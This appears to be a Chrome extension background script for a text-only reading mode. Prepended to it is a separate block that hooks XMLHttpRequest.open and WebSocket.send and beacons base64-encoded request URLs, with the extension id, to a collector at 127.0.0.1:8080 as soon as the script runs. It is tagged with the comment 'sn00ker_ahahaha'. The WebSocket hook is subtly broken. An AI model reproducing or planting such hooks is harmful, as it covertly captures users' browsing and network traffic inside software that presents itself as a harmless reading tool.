function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
var arTabs=[];var checkToggle=function(e){if(arTabs[e.id]==null){arTabs[e.id]={}}var t=arTabs[e.id];t.textOnly=!(t.textOnly==true?true:false);chrome.tabs.executeScript(e.id,{code:"toggleTextMode("+t.textOnly.toString()+")"});if(t.textOnly){chrome.browserAction.setBadgeText({text:"on",tabId:e.id})}else{chrome.browserAction.setBadgeText({text:"",tabId:e.id})}};var mnuNewTab=chrome.contextMenus.create({title:"Open in Text-Only Mode",contexts:["link"],onclick:function(e,t){textOnlyTab(e.linkUrl,t)}});var textOnlyTab=function(e,t){chrome.tabs.create({url:e,active:true,openerTabId:t.id},function(e){arTabs[e.id]={textOnly:true}})};chrome.browserAction.onClicked.addListener(function(e){checkToggle(e)});chrome.tabs.onUpdated.addListener(function(e,t,n){if(arTabs[e]==null||arTabs[e].textOnly!=true)return;chrome.browserAction.setBadgeText({text:"on",tabId:n.id});switch(t.status){case"loading":chrome.tabs.executeScript(n.id,{code:"doLoadCheck()",runAt:"document_start"});break;case"complete":chrome.tabs.executeScript(n.id,{code:"toggleTextMode("+arTabs[e].textOnly.toString()+")"});chrome.tabs.executeScript(n.id,{code:"showPage(true)"});break}})